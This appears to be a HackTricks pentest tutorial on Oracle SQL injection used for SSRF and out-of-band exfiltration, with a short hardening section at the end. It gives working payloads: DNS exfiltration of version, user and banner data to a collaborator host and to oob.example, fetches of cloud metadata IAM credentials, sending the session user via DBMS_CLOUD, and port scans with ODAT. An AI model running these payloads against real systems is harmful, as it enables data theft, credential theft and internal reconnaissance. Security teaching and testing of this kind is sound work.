# Oracle injection

{{#include ../../banners/hacktricks-training.md}}

**This page preserves and extends the techniques from the deleted post [Using SQL injection to perform SSRF/XSPA attacks](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/).**<sup>[[3]](#references)</sup>

## SSRF

Using Oracle to do Out of Band HTTP and DNS requests is well documented but as a means of exfiltrating SQL data in injections. We can always modify these techniques/functions to do other SSRF/XSPA.<sup>[[3]](#references)</sup>

Installing Oracle can be really painful, especially if you want to set up a quick instance to try out commands. My friend and colleague at [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), pointed me to [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) that allowed me to setup an instance on a t2.large AWS Ubuntu machine and Docker.

I ran the docker command with the `--network="host"` flag so that I could mimic Oracle as an native install with full network access, for the course of this blogpost.

```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```

#### Oracle packages that support a URL or a Hostname/Port Number specification <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

In order to find any packages and functions that support a host and port specification, I ran a Google search on the [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html). Specifically,

```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```

The search returned the following results (not all can be used to perform outbound network)

- DBMS_NETWORK_ACL_ADMIN
- UTL_SMTP
- DBMS_XDB
- DBMS_SCHEDULER
- DBMS_XDB_CONFIG
- DBMS_AQ
- UTL_MAIL
- DBMS_AQELM
- DBMS_NETWORK_ACL_UTILITY
- DBMS_MGD_ID_UTL
- UTL_TCP
- DBMS_MGWADM
- DBMS_STREAMS_ADM
- UTL_HTTP

This crude search obviously skips packages like `DBMS_LDAP` (which allows passing a hostname and port number) as [the documentation page](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360) simply points you to a [different location](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360). Hence, there may be other Oracle packages that can be abused to make outbound requests that I may have missed.

In any case, let’s take a look at some of the packages that we have discovered and listed above.

**DBMS_LDAP.INIT**

The `DBMS_LDAP` package allows for access of data from LDAP servers. The `init()` function initializes a session with an LDAP server and takes a hostname and port number as an argument.

This function has been documented before to show exfiltration of data over DNS, like below

```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```

However, given that the function accepts a hostname and a port number as arguments, you can use this to work like a port scanner as well.

Here are a few examples

```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```

`ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` only shows that initialization failed; ACL denial, DNS failure, protocol behavior, and filtering can produce similar results. A returned session value is stronger evidence that the connection succeeded, but always compare against known-open and known-closed controls.<sup>[[4]](#references)</sup>

**UTL_SMTP**

The `UTL_SMTP` package is designed for sending e-mails over SMTP. The example provided on the [Oracle documentation site shows how you can use this package to send an email](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). For us, however, the interesting thing is with the ability to provide a host and port specification.

A crude example is shown below with the `UTL_SMTP.OPEN_CONNECTION` function, with a timeout of 2 seconds

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```

`ORA-29276: transfer timeout` means the operation timed out, not that a particular port state was proven. Conversely, `ORA-29278` containing SMTP reply `421` means an answering peer returned an SMTP status, so the TCP path was reached. ACL denial, DNS failure, and intermediate filtering must be distinguished with controls.<sup>[[4]](#references)</sup>

**UTL_TCP**

The `UTL_TCP` package and its procedures and functions allow [TCP/IP based communication with services](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). If programmed for a specific service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of a TCP/IP connection can be controlled.

The example [on the Oracle documentation site shows how you can use this package to make a raw TCP connection to fetch a web page](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP service.

```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
  retval pls_integer;
BEGIN
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
  retval pls_integer;
BEGIN
  c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
```

Interestingly, due to the ability to craft raw TCP requests, this package can also be used to query the Instance meta-data service of all cloud providers as the method type and additional headers can all be passed within the TCP request.

**UTL_HTTP and Web Requests**

Perhaps the most common and widely documented technique in every Out of Band Oracle SQL Injection tutorial out there is the [`UTL_HTTP` package](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070). This package is defined by the documentation as - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`

```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```

You could additionally, use this to perform some rudimentary port scanning as well with queries like

```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```

`ORA-29263: HTTP protocol error` or returned data can indicate that a TCP connection was established to a non-HTTP or HTTP service. `ORA-12541`, timeouts, and `ORA-29273` are not definitive closed-port signals because ACLs, proxies, DNS, and filtering can produce overlapping failures; enable detailed exceptions and calibrate against controls.<sup>[[5]](#references)</sup>

Another package I have used in the past with varied success is the [`GETCLOB()` method of the `HTTPURITYPE` Oracle abstract type](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) that allows you to interact with a URL and provides support for the HTTP protocol. The `GETCLOB()` method is used to fetch the GET response from a URL as a [CLOB data type.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)

```
SELECT HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() FROM dual;
```

---

## Additional packages and techniques (Oracle 19c → 26ai)

### `UTL_INADDR` — DNS exfiltration and host discovery

`UTL_INADDR.GET_HOST_ADDRESS` forces name resolution, which is useful when the SQL response is blind. Encode the value before placing it in a label: raw database strings can contain dots or characters that are invalid in DNS names, and long values must be split into chunks. The following example leaks 20 bytes as a DNS-safe hexadecimal label and adds an index so callbacks can be reordered.<sup>[[3]](#references)[[4]](#references)</sup>

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS(
  LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(
    SUBSTR((SELECT banner FROM v$version WHERE ROWNUM = 1), 1, 20)
  ))) || '.01.oob.example'
) FROM dual;
```

Contrary to a common assumption, `UTL_INADDR` is **not an ACL bypass** on supported releases. Network ACLs also cover name resolution; an unusable ACL normally produces `ORA-24247`, while an allowed lookup for a nonexistent name normally produces `ORA-29257`. A callback can still be observed even when the SQL expression ultimately raises an error.<sup>[[4]](#references)</sup>

### Enumerating the effective network ACL surface

Having `EXECUTE` on a networking package and having permission to reach a target are separate conditions. Since Oracle 11g, fine-grained network ACLs cover `UTL_TCP`, `UTL_SMTP`, `UTL_MAIL`, `UTL_HTTP`, `UTL_INADDR`, `DBMS_LDAP`, and `HttpUriType`. Relevant privileges include `connect`/protocol-specific privileges for sockets and `resolve` for DNS. Port ranges, exact hosts, domains, wildcard domains, and IP subnets can have different results.<sup>[[4]](#references)</sup>

An unprivileged account can inspect its evaluated entries through `USER_HOST_ACES`:

```sql
SELECT host, lower_port, upper_port, privilege, status
FROM user_host_aces
ORDER BY host, lower_port, upper_port, privilege;
```

For one candidate host, reproduce Oracle's host-precedence evaluation rather than assuming that a broad-looking entry wins:

```sql
SELECT host, lower_port, upper_port, privilege, status
FROM (
  SELECT a.*,
         DBMS_NETWORK_ACL_UTILITY.CONTAINS_HOST('10.0.0.5', host) AS precedence
  FROM user_host_aces a
)
WHERE precedence IS NOT NULL
ORDER BY precedence DESC, lower_port NULLS LAST, upper_port NULLS LAST;
```

Useful failure signals are:

- `ORA-24247`: the evaluated ACL denied the operation.
- `ORA-29257`: DNS was attempted but the name was not resolved.
- `ORA-29024`: the TCP/TLS path was reached but certificate validation failed.
- `ORA-29273`: generic `UTL_HTTP` failure; enable detailed exceptions before treating it as a port state.

Errors vary by package, protocol banner, listener behavior, proxying, and timeout. Therefore, do not label a port open or closed from one Oracle error alone; compare repeatable timing and detailed exceptions with a known-open and known-closed control.<sup>[[5]](#references)</sup>

### Stateful `UTL_HTTP`: headers, methods, redirects and TLS

The one-line `UTL_HTTP.REQUEST` helper is insufficient for targets that require non-`GET` methods or headers. `BEGIN_REQUEST` plus `SET_HEADER` can reach authenticated internal APIs and metadata services that reject headerless legacy requests. Keep timeouts short during internal discovery and close every response to avoid exhausting session resources.<sup>[[5]](#references)</sup>

```sql
DECLARE
  req  UTL_HTTP.req;
  resp UTL_HTTP.resp;
BEGIN
  UTL_HTTP.SET_DETAILED_EXCP_SUPPORT(TRUE);
  UTL_HTTP.SET_TRANSFER_TIMEOUT(3);
  req := UTL_HTTP.BEGIN_REQUEST(
           'http://169.254.169.254/computeMetadata/v1/instance/id', 'GET');
  UTL_HTTP.SET_HEADER(req, 'Metadata-Flavor', 'Google');
  resp := UTL_HTTP.GET_RESPONSE(req);
  DBMS_OUTPUT.PUT_LINE(resp.status_code);
  UTL_HTTP.END_RESPONSE(resp);
END;
/
```

`SET_FOLLOW_REDIRECT` controls redirect following and can be applied to the session or a request. HTTPS also needs a usable trust store. On releases/updates that support the operating-system certificate store, `wallet_path => 'system:'` may make HTTPS callouts succeed without a hand-built Oracle wallet; older installations generally require a configured wallet. Host ACL checks still apply.<sup>[[5]](#references)</sup>

```sql
SELECT UTL_HTTP.REQUEST(
  'https://oob.example/ping',
  wallet_path => 'system:'
) FROM dual;
```

### `DBMS_CLOUD.SEND_REQUEST` on cloud-enabled deployments

Autonomous Database and installations that expose `DBMS_CLOUD` provide another HTTP primitive. `SEND_REQUEST` supports `GET`, `PUT`, `POST`, `HEAD`, and `DELETE`, custom JSON-formatted headers, and request bodies. For an anonymous endpoint, `credential_name => NULL` can be used; cloud-native APIs normally need a compatible stored credential or resource principal.<sup>[[1]](#references)</sup>

```sql
DECLARE
  resp DBMS_CLOUD_TYPES.resp;
BEGIN
  resp := DBMS_CLOUD.SEND_REQUEST(
    credential_name => NULL,
    uri             => 'https://oob.example/db',
    method          => DBMS_CLOUD.METHOD_GET,
    headers         => JSON_OBJECT('X-DB-User' VALUE SYS_CONTEXT('USERENV','SESSION_USER'))
  );
  DBMS_OUTPUT.PUT_LINE(DBMS_CLOUD.GET_RESPONSE_TEXT(resp));
END;
/
```

Check `ALL_CREDENTIALS`/`USER_CREDENTIALS` for credential names visible to the session, but do not expect clear-text secrets. Availability, URI allowlists, authentication behavior, and outbound filtering differ between Autonomous and customer-managed installations. Also, the documented `timeout` argument controls polling for asynchronous work requests; it is not a general synchronous TCP connect/read timeout.<sup>[[1]](#references)</sup>

### Automating network primitives with ODAT

[ODAT](https://github.com/quentinhardy/odat) has distinct `utlhttp`, `httpuritype`, and `utltcp` modules. They test package usability, send requests, or scan ports **after obtaining Oracle credentials**; they do not automatically convert a web SQL-injection point into an OOB payload and there is no `dbms_cloud` module in the current release.<sup>[[2]](#references)</sup>

```bash
# Test each primitive with authenticated database access
./odat.py utlhttp     -s 10.10.10.5 -d XE -U SCOTT -P tiger --test-module
./odat.py httpuritype -s 10.10.10.5 -d XE -U SCOTT -P tiger --test-module
./odat.py utltcp      -s 10.10.10.5 -d XE -U SCOTT -P tiger --test-module

# Scan an internal range from the database server
./odat.py utlhttp -s 10.10.10.5 -d XE -U SCOTT -P tiger \
  --scan-ports 10.0.0.5 20-100
```

### PL/SQL wrappers and hardening notes

When direct package calls fail, application-owned PL/SQL wrappers are worth reviewing, but their object grants, input validation, effective principal, and actual call path must be inspected; the mere presence of a wrapper does not prove that a network call is reachable. Oracle evaluates external-service permissions through the configured host and wallet ACLs.<sup>[[4]](#references)</sup>

Defensively, bind variables remain the primary SQL-injection fix. In addition, revoke unnecessary `EXECUTE` grants on network packages, restrict ACLs to exact destinations and ports, block database-server access to link-local metadata addresses at the egress layer, and audit calls from unexpected schemas. These controls limit the SSRF/OOB impact if an injection bug survives.<sup>[[4]](#references)</sup>



## References

- [1] [Oracle Docs – DBMS_CLOUD Subprograms and REST APIs (`SEND_REQUEST`)](https://docs.oracle.com/en-us/iaas/autonomous-database-serverless/doc/dbms-cloud-subprograms.html)
- [2] [quentinhardy/odat – Oracle Database Attacking Tool](https://github.com/quentinhardy/odat)
- [3] [Using SQL injection to perform SSRF/XSPA attacks (ibreak.software)](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)
- [4] [Oracle AI Database Security Guide – Managing Fine-Grained Access in PL/SQL Packages and Types](https://docs.oracle.com/en/database/oracle/oracle-database/26/dbseg/managing-fine-grained-access-in-pl-sql-packages-and-types.html)
- [5] [Oracle AI Database PL/SQL Packages and Types Reference – `UTL_HTTP`](https://docs.oracle.com/en/database/oracle/oracle-database/26/arpls/UTL_HTTP.html)
{{#include ../../banners/hacktricks-training.md}}
